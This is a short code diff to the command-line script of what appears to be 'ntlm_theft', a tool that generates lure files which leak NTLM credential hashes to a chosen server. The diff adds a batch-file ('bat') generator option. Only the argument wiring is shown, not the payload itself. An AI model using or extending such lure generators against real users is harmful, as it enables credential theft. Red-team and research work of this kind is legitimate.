@@ -9,6 +9,7 @@ from sys import exit
 
 from ntlm_theft.files import (
     create_scf,
+    create_bat,
     create_url_url,
     create_url_icon,
     create_lnk,
@@ -64,6 +65,7 @@ def main():
                 "modern",
                 "all",
                 "scf",
+                "bat",
                 "url",
                 "lnk",
                 "rtf",
@@ -121,6 +123,12 @@ def main():
             args.generate,
             args.server,
             os.path.join(args.filename, args.filename + ".scf"),
+        )
+
+        create_bat(
+            args.generate,
+            args.server,
+            os.path.join(args.filename, args.filename + ".bat"),
         )
 
         create_url_url(
@@ -417,6 +425,13 @@ def main():
             args.generate,
             args.server,
             os.path.join(args.filename, args.filename + ".theme"),
+        )
+
+    elif args.generate == "bat":
+        create_bat(
+            args.generate,
+            args.server,
+            os.path.join(args.filename, args.filename + ".bat"),
         )
 
     print("Generation Complete.")
